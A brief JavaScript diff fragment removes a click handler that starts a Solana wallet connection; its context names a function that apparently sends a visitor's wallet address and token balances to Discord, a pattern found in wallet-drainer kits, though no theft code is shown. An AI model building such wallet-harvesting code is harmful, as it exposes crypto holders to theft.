@@ -87,8 +87,3 @@ async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
     console.error("Failed to send embed", err);
   }
 }
-
-// === Listen for the Web3Modal button click and trigger Solana wallet connection ===
-document.querySelector('w3m-core-button').addEventListener('click', () => {
-  connectSolanaWallet();
-});
